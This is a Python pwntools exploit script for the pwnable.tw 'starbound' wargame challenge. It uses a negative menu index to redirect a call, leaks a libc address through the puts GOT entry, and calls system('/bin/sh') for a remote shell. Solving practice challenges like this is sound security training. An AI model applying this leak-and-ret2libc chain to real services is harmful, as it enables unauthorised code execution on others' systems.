#coding=utf-8
from pwn import *
from LibcSearcher import *
local = 0
exec_file="./starbound"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = True)
argv=[]
if local :
    a=process(exec_file)
    if context.arch == "i386" :
        libc=ELF("/lib/i386-linux-gnu/libc.so.6",checksec = False)
    elif context.arch == "amd64" :
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec = False) 
else:
    a=remote("chall.pwnable.tw",10202)
    #libc=ELF("./libc.so.6")
def get_base(a):
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc-2.31.so" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    b *0x0804A65D
    '''
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))
def menu(idx):
    a.sendlineafter("> ",str(idx))
def set_name(name):
    menu(6)
    menu(2)
    a.sendafter("Enter your name: ",name)
    return 

def delete(idx):
    return 
    
def edit(idx,content):
    return 
    
def show(idx):
    return 
relloc_offset = [0,2,4,6,0xb,0xc,0x10]
#payload='\x00'*0x33+p64(0x00000000fbad1800)+p64(0)*3+'\x00'    #stdout-0x33
payload = p32(0x08048e48) * (0x64 / 4)
set_name(payload)
menu(1)
#debug()
payload = "-10\x00" + p32(0) + p32(elf.plt["puts"]) +p32(0x804A605)+ p32(elf.got["puts"]) 
a.sendlineafter("> ",payload)
puts_addr = u32(a.recv(4))
libc =LibcSearcher("puts",puts_addr)
libc_base = puts_addr - libc.dump("puts")
fuck(libc_base)
payload = "/bin/sh\x00" + p32(0x08048e48) * (0x5c / 4)
set_name(payload)
menu(1)
#debug()
pop_3_ret = 0x080494da
payload = "-10\x00" + p32(0) + p32(libc_base + libc.dump("system")) +p32(0)+ p32(0x80580D0)
#payload = "-10\x00" + p32(0) + p32(elf.plt["open"]) + p32(pop_3_ret) + p32(0x80580D0) + p32(0) + p32(0)
#payload += p32(elf.plt["read"]) + p32(pop_3_ret) + p32(3) + p32(elf.bss() + 0x800) + p32(0x30)
#payload += p32(elf.plt["write"]) + p32(pop_3_ret) + p32(1) + p32(elf.bss()+ 0x800) + p32(0x30)
a.sendlineafter("> ",payload)
a.interactive()
